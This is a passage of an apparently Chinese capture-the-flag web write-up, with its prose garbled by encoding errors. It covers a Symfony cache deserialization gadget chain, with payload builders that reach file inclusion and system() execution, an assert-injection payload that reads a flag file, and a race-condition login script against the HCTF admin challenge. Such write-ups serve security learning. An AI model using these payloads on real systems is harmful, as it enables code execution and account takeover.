class="keyword">true</span>;</span><br><span class="line">        $tagsByKey = [];</span><br><span class="line">        $invalidatedTags = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($tags <span class="keyword">as</span> $tag) &#123;</span><br><span class="line">            CacheItem::validateKey($tag);</span><br><span class="line">            $invalidatedTags[$tag] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;deferred) &#123;</span><br><span class="line">            $items = <span class="keyword">$this</span>-&gt;deferred;</span><br><span class="line">            <span class="keyword">foreach</span> ($items <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item)) &#123;</span><br><span class="line">                    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;deferred[$key]);</span><br><span class="line">                    $ok = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;getTagsByKey;</span><br><span class="line">            $tagsByKey = $f($items);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $tagVersions = <span class="keyword">$this</span>-&gt;getTagVersions($tagsByKey, $invalidatedTags);</span><br><span class="line">        $f = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($tagsByKey <span class="keyword">as</span> $key =&gt; $tags) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($f(<span class="keyword">static</span>::TAGS_PREFIX.$key, array_intersect_key($tagVersions, $tags), $items[$key]));</span><br><span class="line">        &#125;</span><br><span class="line">        $ok = <span class="keyword">$this</span>-&gt;pool-&gt;commit() &amp;&amp; $ok;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($invalidatedTags) &#123;</span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;invalidateTags;</span><br><span class="line">            $ok = $f(<span class="keyword">$this</span>-&gt;tags, $invalidatedTags) &amp;&amp; $ok;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $ok;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$item <span class="keyword">instanceof</span> CacheItem) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred[$item-&gt;getKey()] = $item;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commit</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;invalidateTags([]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°<code>$this-&gt;pool-&gt;saveDeferred($item)</code> è¿™ä¸€æ®µæ˜¯æˆ‘ä»¬å¯ä»¥æ“æ§çš„.åœ¨é¡¹ç›®ä¸­å…¨å±€æœç´¢å«æœ‰saveDeferredæ–¹æ³•æˆ–è€…__callæ–¹æ³•çš„ç±».æœ€ç»ˆç»è¿‡ç­›é€‰å¾—åˆ°çš„ç»“æœå¦‚ä¸‹:</p>
<p>PhpArrrayAdapter.php(åˆ æ‰å¾ˆå¤šæ— ç”¨çš„ä¸œè¥¿äº†):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemPoolInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Exception</span>\<span class="title">InvalidArgumentException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">PruneableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">ResettableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ContractsTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">PhpArrayTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>\<span class="title">CacheInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span> <span class="keyword">implements</span> <span class="title">AdapterInterface</span>, <span class="title">CacheInterface</span>, <span class="title">PruneableInterface</span>, <span class="title">ResettableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">PhpArrayTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ContractsTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $createCacheItem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> === <span class="keyword">$this</span>-&gt;values) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;keys[$item-&gt;getKey()]) &amp;&amp; <span class="keyword">$this</span>-&gt;pool-&gt;saveDeferred($item);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è·Ÿè¿›initializeæ–¹æ³•,å‘ç°æ˜¯ä»PhpArrayTrait.php é‡Œé¢æ¥çš„.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">initialize</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $values = (<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file) ?: [[], []];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">2</span> !== \count($values) || !<span class="keyword">isset</span>($values[<span class="number">0</span>], $values[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;keys = <span class="keyword">$this</span>-&gt;values = [];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="keyword">$this</span>-&gt;keys, <span class="keyword">$this</span>-&gt;values) = $values;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰æ–‡ä»¶åŒ…å«,äºæ˜¯æ„é€ payload,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// https://www.cnblogs.com/wfzWebSecuity/p/11263051.html</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">// PhpArrrayAdapter.php ä¸­$itemçš„å‚æ•°å¿…é¡»å®ç°äº†CacheItemInterfaceæ¥å£,åœ¨å¤´éƒ¨çš„useé¡¹ä¸­å¯ä»¥æ‰¾åˆ°use Symfony\Component\Cache\CacheItem;å¹¶ä¸”å‘ç°ä»–å®ç°äº†è¿™ä¸ªæ¥å£,é‚£ä¹ˆå°±ä½¿ç”¨å®ƒ,æ²¡æœ‰å…·ä½“å†…å®¹.</span><br><span class="line"><span class="comment">// æ²¡æœ‰å…³ç³»çš„ä¸åŒçš„å‘½åç©ºé—´ä¹‹é—´éœ€è¦ç”¨èŠ±æ‹¬å·æ¥éš”ç¦»å¼€æ¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="comment">// class ProxyAdapterTest&#123;&#125;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $file;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'/flag'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = <span class="keyword">array</span>(<span class="string">'tr1ple'</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$obj = <span class="keyword">new</span> TagAwareAdapter();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒç§è§£æ³•:</p>
<p>ProxyAdapter.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Psr</span>\<span class="title">Cache</span>\<span class="title">CacheItemPoolInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">PruneableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">ResettableInterface</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ContractsTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Contracts</span>\<span class="title">Cache</span>\<span class="title">CacheInterface</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Nicolas Grekas &lt;p<span class="doctag">@tchwork</span>.com&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span> <span class="keyword">implements</span> <span class="title">AdapterInterface</span>, <span class="title">CacheInterface</span>, <span class="title">PruneableInterface</span>, <span class="title">ResettableInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ContractsTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $namespace;</span><br><span class="line">    <span class="keyword">private</span> $namespaceLen;</span><br><span class="line">    <span class="keyword">private</span> $createCacheItem;</span><br><span class="line">    <span class="keyword">private</span> $setInnerItem;</span><br><span class="line">    <span class="keyword">private</span> $poolHash;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">saveDeferred</span><span class="params">(CacheItemInterface $item)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;doSave($item, <span class="keyword">__FUNCTION__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">doSave</span><span class="params">(CacheItemInterface $item, $method)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!$item <span class="keyword">instanceof</span> CacheItem) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $item = (<span class="keyword">array</span>) $item;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> === $item[<span class="string">"\0*\0expiry"</span>] &amp;&amp; <span class="number">0</span> &lt; $item[<span class="string">"\0*\0defaultLifetime"</span>]) &#123;</span><br><span class="line">            $item[<span class="string">"\0*\0expiry"</span>] = microtime(<span class="keyword">true</span>) + $item[<span class="string">"\0*\0defaultLifetime"</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($item[<span class="string">"\0*\0poolHash"</span>] === <span class="keyword">$this</span>-&gt;poolHash &amp;&amp; $item[<span class="string">"\0*\0innerItem"</span>]) &#123;</span><br><span class="line">            $innerItem = $item[<span class="string">"\0*\0innerItem"</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">$this</span>-&gt;pool <span class="keyword">instanceof</span> AdapterInterface) &#123;</span><br><span class="line">            <span class="comment">// this is an optimization specific for AdapterInterface implementations</span></span><br><span class="line">            <span class="comment">// so we can save a round-trip to the backend by just creating a new item</span></span><br><span class="line">            $f = <span class="keyword">$this</span>-&gt;createCacheItem;</span><br><span class="line">            $innerItem = $f(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">"\0*\0key"</span>], <span class="keyword">null</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $innerItem = <span class="keyword">$this</span>-&gt;pool-&gt;getItem(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">"\0*\0key"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (<span class="keyword">$this</span>-&gt;setInnerItem)($innerItem, $item);<span class="comment">//è¿™é‡Œå°±æ˜¯ä»£ç æ‰§è¡Œçš„åœ°æ–¹äº†</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pool-&gt;$method($innerItem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                                                     <span class="comment">// pay attention to the two namespace                                      </span></span><br><span class="line"><span class="comment">// the last namespace was included in the first namespace                  </span></span><br><span class="line"><span class="comment">// that is why we do not need to seperate them                             </span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">CacheItem</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $innerItem = <span class="string">"id"</span>;</span><br><span class="line">    <span class="keyword">protected</span> $poolHash = <span class="string">"tr1ple"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $deferred;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pool = $x;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;deferred=<span class="keyword">array</span>(<span class="string">"1"</span> =&gt; <span class="keyword">new</span> CacheItem());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $setInnerItem;</span><br><span class="line">    <span class="keyword">private</span> $poolHash;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setInnerItem = <span class="string">"system"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;poolHash = <span class="string">"tr1ple"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> TagAwareAdapter(<span class="keyword">new</span> ProxyAdapter());</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>
<h2 id="jarvisoj-babyphp">jarvisoj babyphp</h2>
<p>å…³é”®ä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&apos;page&apos;])) &#123;</span><br><span class="line">	$page = $_GET[&apos;page&apos;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page = &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;</span><br><span class="line">assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);</span><br><span class="line">assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>assertå’Œsystem evalä¸€æ ·éƒ½å¯ä»¥æ‰§è¡Œä»£ç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">page=flag&apos;,&apos;..&apos;)==false and system(&apos;cat ./templates/flag.php&apos;);//</span><br></pre></td></tr></table></figure>
<h2 id="hctf-admin">hctf admin</h2>
<p><a href="https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin" target="_blank" rel="noopener">https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin</a></p>
<p><a href="https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/#admin" target="_blank" rel="noopener">https://www.codemonster.cn/2018/11/13/2018-hctf-web-writeup/#admin</a></p>
<p><a href="https://tmr.js.org/p/3a03e44b/" target="_blank" rel="noopener">https://tmr.js.org/p/3a03e44b/</a></p>
<p>è¿™é‡Œåªå¯¹ä¸€äº›å€¼å¾—å­¦ä¹ çš„è„šæœ¬åšä¸€ä¸ªè®°å½•</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin</span></span><br><span class="line"><span class="comment"># è¿™ä¸ªè„šæœ¬ç”¨äºè§£ç ï½†ï½Œï½ï½“ï½‹ä¸­çš„session</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#admin</span></span><br><span class="line"><span class="comment"># æ¡ä»¶ç«äº‰è„šæœ¬</span></span><br><span class="line"><span class="comment"># æœŸæœ›çš„æµç¨‹ä¸ºï¼šæ™®é€šç”¨æˆ·ç™»å½•ï¼¼æ™®é€šç”¨æˆ·ç™»å‡ºï¼¼æ™®é€šç”¨æˆ·å°è¯•ç™»å½•ï½ï½„ï½ï½‰ï½è´¦æˆ·å¹¶å–å¾—ç›¸åº”session,å¹¶åœ¨ç¨‹åºéªŒè¯è¿‡æœŸä¹‹å‰è§¦å‘æ”¹å¯†ç çš„æµç¨‹ï¼Œæ­¤æ—¶åŸæ¥çš„æ™®é€šç”¨æˆ·å·²ç»æ˜¯ï½ï½„ï½ï½‰ï½äº†</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(s, username, password)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'username'</span>: username,</span><br><span class="line">        <span class="string">'password'</span>: password,</span><br><span class="line">        <span class="string">'submit'</span>: <span class="string">''</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/login"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.get(<span class="string">"http://admin.2018.hctf.io/logout"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(s, newpassword)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'newpassword'</span>:newpassword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s.post(<span class="string">"http://admin.2018.hctf.io/change"</span>, data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(s)</span>:</span></span><br><span class="line">    login(s, <span class="string">'skysec'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    change(s, <span class="string">'skysec'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func2</span><span class="params">(s)</span>:</span></span><br><span class="line">    logout(s)</span><br><span class="line">    res = login(s, <span class="string">'admin'</span>, <span class="string">'skysec'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'&lt;a href="/index"&gt;/index&lt;/a&gt;'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(<span class="string">'finish'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        print(i)</span><br><span class="line">        s = requests.Session()</span><br><span class="line">        t1 = threading.Thread(target=func1, args=(s,))</span><br><span class="line">        t2 = threading.Thread(target=func2, args=(s,))</span><br><span class="line">        t1.start()</span><br><span class="line">        t2.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="2019-CISCN-northern-DropBox">2019 CISCN northern DropBox</h2>
<p><img src="https://user-images.githubusercontent.com/40637063/61511347-040f3f80-aa29-11e9-8846-e8a0e0a769c0.png" alt="1562476128111"></p>
<p>å½“ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶(åªèƒ½æ˜¯jpgpngè¿™äº›)ä¹‹å,é¡µé¢ä¼šç»™æˆ‘ä»¬æä¾›ä¸‹è½½å’Œåˆ é™¤åŠŸèƒ½.</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511378-2a34df80-aa29-11e9-8268-6c6ccba139cd.png" alt="1562476266190"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æŠŠä¸€äº›æºä»£ç  <code>class.php</code> <code>upload.php</code> <code>download.php</code> <code>delete.php</code> and <code>index.php</code> ç»™ä¸‹è½½ä¸‹æ¥.(need absolutely path)</p>
<p><img src="https://user-images.githubusercontent.com/40637063/61511425-4a649e80-aa29-11e9-8161-9266a5df971b.png" alt="1562476753974"></p>
<p>source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">download.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span 